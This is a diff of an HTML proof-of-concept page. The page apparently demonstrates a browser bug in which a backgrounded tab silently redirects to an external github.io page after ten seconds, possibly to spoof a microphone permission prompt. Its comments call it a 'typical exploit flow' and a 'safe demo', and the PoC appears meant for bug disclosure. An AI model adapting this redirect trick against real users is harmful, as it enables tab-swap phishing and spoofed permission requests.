@@ -1,32 +1,37 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="utf-8">
-    <title></title>
-</head>
-
+<head><meta charset="utf-8"><title>PoC - index</title></head>
 <body>
-    <script>
-        window.onload = function () {
-            document.addEventListener('visibilitychange', () => {
-                if (document.visibilityState === 'visible') {
-                    console.log("Content is displayed.");
-                }
-                if (document.visibilityState === 'hidden') {
-                    console.log("Content is background.");
-                    setTimeout(go, 10000); // safer than passing string
-                }
-            });
-        };
+  <h3>PoC — Click the button</h3>
+  <button id="openBtn">Open a New Tab</button>
+  <pre id="log"></pre>
 
-        function go() {
-            var targetPermission = "microphone";
-            document.cookie = "load=0";
-            window.location = "https://mrnoob790.github.io/second.html";
+  <script>
+    const logEl = document.getElementById('log');
+    function log(s){ console.log(s); logEl.textContent += s + "\n"; }
+
+    document.getElementById('openBtn').addEventListener('click', function (e) {
+      // IMPORTANT: window.open must be called synchronously inside this click handler
+      const newWin = window.open('https://mrnoob790.github.io/second.html', '_blank', 'noopener');
+      if (!newWin) {
+        log('window.open returned null — popup blocked by browser or returned window not allowed.');
+        alert('Popup blocked (check Arc settings / extensions). See console for details.');
+        return;
+      }
+      log('New tab/window opened successfully.');
+      // Now watch visibilitychange on THIS page — typical exploit flow:
+      document.addEventListener('visibilitychange', function onV(){
+        log('visibility changed: ' + document.visibilityState);
+        if (document.visibilityState === 'hidden') {
+          log('This tab is backgrounded. Will redirect after 10s.');
+          setTimeout(function(){
+            // safe demo: just navigate this tab to second.html
+            window.location.href = 'https://mrnoob790.github.io/second.html';
+          }, 10000);
+          document.removeEventListener('visibilitychange', onV);
         }
-    </script>
-
-    <br><br><br>
-    <a href="https://example.com/" target="_blank">Open a New Tab</a>
+      });
+    });
+  </script>
 </body>
 </html>
